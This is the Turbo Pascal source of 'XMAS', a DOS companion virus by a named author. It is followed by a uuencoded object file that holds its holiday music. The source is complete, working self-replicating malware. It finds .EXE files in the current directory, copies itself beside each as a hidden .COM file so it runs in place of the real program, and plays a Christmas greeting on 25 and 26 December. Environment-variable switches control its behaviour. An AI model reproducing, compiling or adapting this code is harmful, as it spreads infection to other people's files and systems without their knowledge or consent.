*******
** xmas.pas
*******


{

    XMAS Virus, a non-resident spawning .EXE infector by Glenn Benton
    To be compiled with Turbo Assembler 6.0

    Files required : XMAS.PAS       - Viral part (this one)
                     XMAS.OBJ       - Music data (composed by myself!)
                     PLAYIT.TPU     - Music player engine

    Set the environment variables for different effects :

    SET XMAS=YES          (Disable virus)
    SET XMAS=TST          (Plays the music only)
    SET XMAS=DEL          (Deletes the virus when a program is started)

    The compiled virus example is compressed and uses 6888 bytes...

        On 25th and 26th the virus activates, playing the music and
        wishes you a merry X-mas (nice of me, isn't it?)
        

}

Program Xmas;

{$M 4096,0,512}

Uses Crt, Dos, Playit;

Label StartOrig;

Var
   Year, Month, Day, DayOfWeek : Word;
   DirInfo : SearchRec;
   ComSeek : SearchRec;
   FileFound : Boolean;
   FileName : String;
   Parameters : String;
   OrigName : String;
   P : Byte;
   ExtHere : Boolean;
   Teller : Word;
   StopChar : Char;
   FromF : File;

{Dit is de data van het te spelen liedje}
{$L XMAS.OBJ}
Procedure Christmas; EXTERNAL;

{Deze routine wordt aangeroepen als het 25 of 26 december is}
Procedure Active;
Begin;
StopChar := #0;
ClrScr;
GotoXY(32,5);
WriteLn('Merry Christmas');
GotoXY(38,7);
WriteLn('and');
GotoXY(31,9);
WriteLn('A Happy New Year!');
GotoXy(31,11);
WriteLn('Wished To You By:');
GotoXy(34,17);
WriteLn('Glenn Benton');
GotoXy(27,24);
WriteLn('Press any key to continue');
Repeat
      PlayOBJ(@Christmas, TRUE, StopChar);
Until StopChar<>#0;
End;

{Deze procedure zoekt een EXE file waarvan er geen COM is en stuurt het
 resultaat in de boolean FileFound en de naam van het te maken COM bestand
 in FileName}
Procedure FileSeek;

Label Seeker, FileSeekOk;
Begin;
FileFound:=False;
FindFirst('*.EXE',Anyfile,DirInfo);

Seeker:
If DosError=18 Then Exit;
FileName:= DirInfo.Name;
Delete(FileName,Length(FileName)-2,3);
Insert('COM',FileName,Length(FileName)+1);
FindFirst(FileName,AnyFile,ComSeek);
If DosError=18 Then Goto FileSeekOk;
FindNext(DirInfo);
Goto Seeker;

FileSeekOk:
FileFound:=True;
End;

Procedure CopyFile;
var
  FromF, ToF: file;
  NumRead, NumWritten: Word;
  buf: array[1..512] of Char;
begin;
  { Open input file }
  Assign(FromF, ParamStr(0));
  { Record size = 1 }
  Reset(FromF, 1);
  { Open output file }
  Assign(ToF, FileName);
  { Record size = 1 }
  Rewrite(ToF, 1);
  repeat
    BlockRead(FromF,buf,
              SizeOf(buf),NumRead);
    BlockWrite(ToF,buf,NumRead,NumWritten);
  until (NumRead = 0) or
        (NumWritten <> NumRead);
  Close(FromF);
  Close(ToF);
  Assign(ToF,FileName);
  SetFAttr(ToF,Hidden);
end;


Begin; {Hoofdprocedure}
If (GetEnv('XMAS')='DEL') or (GetEnv('XMAS')='del') Then
   Begin;
   OrigName:=ParamStr(0);
   ExtHere:=False;
   P:=Pos('.COM',OrigName);
   If P<>0 Then ExtHere:=True;
   P:=Pos('.com',OrigName);
   If P<>0 Then ExtHere:=True;
   If ExtHere=False Then
                 OrigName:=OrigName+'.COM';
   Assign(FromF, OrigName);
   SetFAttr(FromF,Archive);
   Erase(FromF);
   Goto StartOrig;
   End;
If (GetEnv('XMAS')='TST') or (GetEnv('XMAS')='tst') Then
   Begin;
   Active;
   Goto StartOrig;
   End;

If (GetEnv('XMAS')='YES') or (GetEnv('XMAS')='yes') Then Goto StartOrig;

{Datum bekijken of het 25 of 26 december is en indien juist Active aanroepen}
GetDate(Year, Month, Day, DayOfWeek);
If (Month=12) and ((Day=25) or (Day=26)) then Active;

{Procedure voor EXE file zoeken aanroepen}
FileSeek;

{Als er een kandidaat is gevonden, dit prg als COM erbij zetten}
If FileFound=False Then Goto StartOrig;
CopyFile;

StartOrig:
Parameters:='';
For Teller:= 1 to ParamCount Do Parameters:=Parameters+' '+ParamStr(Teller);
OrigName:=ParamStr(0);
ExtHere:=False;
P:=Pos('.COM',OrigName);
If P<>0 Then ExtHere:=True;
P:=Pos('.com',OrigName);
If P<>0 Then ExtHere:=True;
If ExtHere=False Then
                 OrigName:=OrigName+'.EXE';
If ExtHere=True Then
                 Begin;
                 Delete(OrigName,Length(OrigName)-3,4);
                 OrigName:=OrigName+'.EXE';
                 End;
SwapVectors;
Exec(OrigName,Parameters);
SwapVectors;
Halt(DosExitCode);
End.
*******
** xmas_obj.uue
*******


begin 775 xmas.obj
M@`0``CHZ!I8(```$0T]$10!#F`<`*"08`@$!^9`0```!"4-(4DE35$U!4P``
M`*B@!`0!``#__________________________P`&```````````````````$
M$`H``=`*``40"@`!T`H`!!`*``'0"@`%$`H``=`*``00"@`!T`H`!1`*``'0
M"@`$$`H``=`*``40"@`!T`H`!!`*``'0"@`%$`H``=`*``00"@`!T`H`!1`*
M``'0"@`$$`H``=`*``40"@`!T`H`!!`*``'0"@`%$`H``=`*``1@"@`$8`H`
M!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$
M8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@
M"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*
M``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H`
M`V`*``2`"@`$8`H`!8`*``-@"@`$@`H`!&`*``6`"@`#8`H`!(`*``1@"@`%
M@`H``V`*``2`"@`$8`H`!8`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@
M"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!%`*
M``1@"@`%4`H``V`*``10"@`$8`H`!5`*``-@"@`$4`H`!&`*``50"@`#8`H`
M!%`*``1@"@`%4`H``V`*``0P"@`$,`H`!3`*``,P"@`$,`H`!#`*``4P"@`#
M,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P"@`$,`H`!#`*``4P
M"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P"@`$,`H`!#`*
M``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P"@`$,`H`
M!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P"@`$
M,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P
M"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*
M``,P"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`
M!3`*``,P"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``2`"@`$
M@`H`!8`*``.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H``X`*``2`
M"@`$@`H`!8`*``.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H`"J`$
M!`$`!`.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H``X`*``2`"@`$
M@`H`!8`*``.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H``X`*``2`
M"@`$@`H`!8`*``.`"@`$H`H`!(`*``6@"@`#@`H`!*`*``2`"@`%H`H``X`*
M``2@"@`$@`H`!:`*``.`"@`$H`H`!(`*``6@"@`#@`H`!(`*``2`"@`%@`H`
M`X`*``2`"@`$@`H`!8`*``.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%
M@`H``X`*``1@"@`$@`H`!6`*``.`"@`$8`H`!(`*``5@"@`#@`H`!&`*``2`
M"@`%8`H``X`*``1@"@`$@`H`!6`*``.`"@`$4`H`!%`*``50"@`#4`H`!%`*
M``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`
M!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#
M4`H`!%`*``10"@`%4`H``U`*``00"@`$4`H`!1`*``-0"@`$$`H`!%`*``40
M"@`#4`H`!!`*``10"@`%$`H``U`*``00"@`$4`H`!1`*``-0"@`$$`H`!%`*
M``40"@`#4`H`!!`*``10"@`%$`H``U`*``00"@`$4`H`!1`*``-0"@`$$`H`
M!%`*``40"@`#4`H`!!`*``10"@`%$`H``U`*``00"@`$4`H`!1`*``-0"@`$
M$`H`!%`*``40"@`#4`H`!!`*``10"@`%$`H``U`*``00"@`$4`H`!1`*``-0
M"@`$$`H`!%`*``40"@`#4`H`!!`*``10"@`%$`H``U`*``00"@`$4`H`!1`*
M``-0"@`$H`H`!*`*``6@"@`#H`H`!*`*``2@"@`%H`H``Z`*``2@"@`$H`H`
M!:`*``.@"@`$H`H`!*`*``6@"@`#H`H`!*`*``2@"@`%H`H``Z`*``2@"@`$
MH`H`!:`*``.@"@`$H`H`!*`*``6@"@`#H`H`!*`*``2@"@`%H`H``Z`*``2@
M"@`$H`H`!:`*``.@"@`$H`H`!*`*``6@"@`#H`H`!*`*``2@"@`%H`H``Z`*
M``2@"@`$H`H`!:`*``.@"@`$L`H`!*`*``6P"@`#H`H`!+`*``2@"@`%L`H`
M`Z`*``2P"@`$H`H`!;`*``.@"@`$L`H`!*`*``6P"@`#H`H`!*`*``2@"@`%
MH`H``Z`*``2@"@`$H`H`!:`*``.@"@`$H`H`!*`*``6@"@`#H`H`!*`*``2@
M"@`%H`H``Z`*``2`"@`$H`H`!8`*``.@"@`$@`H`!*`*``6`"@!SH`0$`0`(
M`Z`*``2`"@`$H`H`!8`*``.@"@`$@`H`!*`*``6`"@`#H`H`!&`*``1@"@`%
M8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@
M"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*
M``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$,`H`!&`*``4P"@`#8`H`
M!#`*``1@"@`%,`H``V`*``0P"@`$8`H`!3`*``-@"@`$,`H`!&`*``4P"@`#
M8`H`!#`*``1@"@`%,`H``V`*``0P"@`$8`H`!3`*``-@"@`$,`H`!&`*``4P
M"@`#8`H`!#`*``1@"@`%,`H``V`*``00"@`$8`H`!1`*``-@"@`$$`H`!&`*
M``40"@`#8`H`!!`*``1@"@`%$`H``V`*``00"@`$8`H`!1`*``-@"@`$$`H`
M!&`*``40"@`#8`H`!!`*``1@"@`%$`H``V`*``00"@`$8`H`!1`*``-@"@`$
M$`H`!&`*``40"@`#8`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P
M"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*
M``,P"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`
M!3`*``,P"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H``X`*``2`"@`$
M@`H`!8`*``.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H``X`*``2`
M"@`$@`H`!8`*``.`"@`$@`H`!(`*``6`"@`#@`H`!(`*``2`"@`%@`H``X`*
M``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!%`*``10"@`%4`H`
M`U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!%`*``10"@`%
M4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!&`*``1@
M"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*
M``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`
M!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#
M8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@
M"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*`(^@!`0!``P#8`H`
M!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$$`H`!!`*``40"@`#
M$`H`!!`*``00"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40
M"@`#$`H`!!`*``00"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*
M``40"@`#$`H`!!`*``00"@`%$`H``Q`*``1@"@`$8`H`!6`*``-@"@`$8`H`
M!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@"@`$
M8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@
M"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*
M``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`
M!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$
M8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@
M"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*
M``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H`
M`V`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!%`*``10"@`%
M4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!%`*``10
M"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!%`*
M``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`
M!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50"@`#
M4`H`!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*``50
M"@`#4`H`!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`!%`*
M``50"@`#4`H`!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0"@`$4`H`
M!%`*``50"@`#4`H`!%`*``10"@`%4`H``U`*``1@"@`$8`H`!6`*``-@"@`$
M8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``1@"@`$8`H`!6`*``-@
M"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H`2Z`$!`$`$`-@"@`$8`H`
M!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*``10"@`$4`H`!5`*``-0"@`$
M4`H`!%`*``50"@`#4`H`!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*``-0
M"@`$4`H`!%`*``50"@`#4`H`!%`*``10"@`%4`H``U`*``10"@`$4`H`!5`*
M``-0"@`$4`H`!%`*``50"@`#4`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`
M!3`*``,P"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$
M,`H`!3`*``,P"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P
M"@`$,`H`!3`*``,P"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H``Q`*
M``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H`
M`Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%
M$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00
M"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*
M``00"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`
M!!`*``00"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#
M$`H`!!`*``00"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40
M"@`#$`H`!!`*``00"@`%$`H``Q`*``00"@`$$`H`!1`*``,0"@`$,`H`!!`*
M``4P"@`#$`H`!#`*``00"@`%,`H``Q`*``0P"@`$$`H`!3`*``,0"@`$,`H`
M!!`*``4P"@`#$`H`!#`*``00"@`%,`H``Q`*``0P"@`$$`H`!3`*``,0"@`$
M,`H`!!`*``4P"@`#$`H`!#`*``00"@`%,`H``Q`*``00"@`$$`H`!1`*``,0
M"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H``Q`*``00"@`$$`H`!1`*
M``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H``Q`*``00"@`$$`H`
M!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H``Q`*``00"@`$
M$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H``Q`*``00
M"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@!WH`0$`0`4`Q`*``00"@`$$`H`
M!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!1`*``00"@`&$`H``Q`*``40"@`$
M$`H`!A`*``,0"@`%$`H`!!`*``80"@`#$`H`!1`*``00"@`&$`H``Q`*``40
M"@`$$`H`!A`*``,0"@`%$`H`!!`*``80"@`#$`H`!1`*``00"@`&$`H``Q`*
M``40"@`$$`H`!A`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%$`H`
M`Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00"@`%
M$`H``Q`*``00"@`$$`H`!1`*``,0"@`$$`H`!!`*``40"@`#$`H`!!`*``00
M"@`%$`H``Q`*``2@"@`$H`H`!:`*``.@"@`$H`H`!*`*``6@"@`#H`H`!*`*
M``2@"@`%H`H``Z`*``2@"@`$H`H`!:`*``.@"@`$H`H`!*`*``6@"@`#H`H`
M!*`*``2@"@`%H`H``Z`*``2@"@`$H`H`!:`*``.@"@`$H`H`!*`*``6@"@`#
MH`H`!(`*``2`"@`%@`H``X`*``2`"@`$@`H`!8`*``.`"@`$@`H`!(`*``6`
M"@`#@`H`!(`*``2`"@`%@`H``X`*``2`"@`$@`H`!8`*``.`"@`$@`H`!(`*
M``6`"@`#@`H`!(`*``2`"@`%@`H``X`*``2`"@`$@`H`!8`*``.`"@`$,`H`
M!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P"@`$
M,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``0P"@`$,`H`!3`*``,P
M"@`$,`H`!#`*``4P"@`#,`H`!#`*``0P"@`%,`H``S`*``10"@`$4`H`!5`*
M``-0"@`$4`H`!%`*``50"@`#4`H`!%`*``10"@`%4`H``U`*``10"@`$4`H`
M!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!%`*``10"@`%4`H``U`*``10"@`$
M4`H`!5`*``-0"@`$4`H`!%`*``50"@`#4`H`!&`*``1@"@`%8`H``V`*``1@
M"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H``V`*
M``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%8`H`
M`V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@"@`%
M8`H``V`*``1@"@`$8`H`!6`*``-@"@`$8`H`!&`*``5@"@`#8`H`!&`*``1@
M"@`%8`H``V`*``1@"@`$8`H`!6`*``.@*``!`!@#8`H`!&`*``1@"@`%8`H`
:`V`*``1@"@`$8`H`!6`*``-@"@!"B@(``'0`
`
end
*******
** playit_tpu.uue
*******
